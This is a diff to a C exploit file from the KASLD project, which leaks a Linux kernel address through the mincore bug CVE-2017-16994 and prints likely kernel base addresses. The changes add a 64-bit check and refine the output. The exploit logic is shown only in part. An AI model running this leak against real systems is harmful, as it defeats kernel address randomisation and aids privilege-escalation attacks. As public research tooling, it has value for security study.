@@ -1,4 +1,4 @@
-// This file is part of KASLD
+// This file is part of KASLD - https://github.com/bcoles/kasld
 // mincore heap page disclosure (CVE-2017-16994)
 // Largely based on original code by Jann Horn:
 // - https://bugs.chromium.org/p/project-zero/issues/detail?id=1431
@@ -27,8 +27,6 @@ unsigned long get_kernel_addr_mincore() {
     unsigned char buf[getpagesize() / sizeof(unsigned char)];
     unsigned long iterations = 1000000;
     unsigned long addr = 0;
-
-    printf("[.] trying mincore info leak...\n");
 
     /* A MAP_ANONYMOUS | MAP_HUGETLB mapping */
     if (mmap((void*)0x66000000, 0x20000000000, PROT_NONE,
@@ -65,13 +63,26 @@ unsigned long get_kernel_addr_mincore() {
 }
 
 int main (int argc, char **argv) {
+  printf("[.] trying mincore info leak...\n");
+
+  struct utsname u = get_kernel_version();
+
+  if (strstr(u.machine, "64") == NULL) {
+    printf("[-] unsupported: system is not 64-bit.\n");
+    exit(1);
+  }
+
   unsigned long addr = get_kernel_addr_mincore();
   if (!addr) return 1;
 
   printf("leaked address: %lx\n", addr);
 
-  printf("kernel base (possible): %lx\n", addr & 0xfffffffffff00000ul);
-  printf("kernel base (possible): %lx\n", addr & 0xffffffffff000000ul);
+  if ((addr & 0xfffffffffff00000ul) == (addr & 0xffffffffff000000ul)) {
+    printf("kernel base (likely): %lx\n", addr & 0xfffffffffff00000ul);
+  } else {
+    printf("kernel base (possible): %lx\n", addr & 0xfffffffffff00000ul);
+    printf("kernel base (possible): %lx\n", addr & 0xffffffffff000000ul);
+  }
 
   return 0;
 }
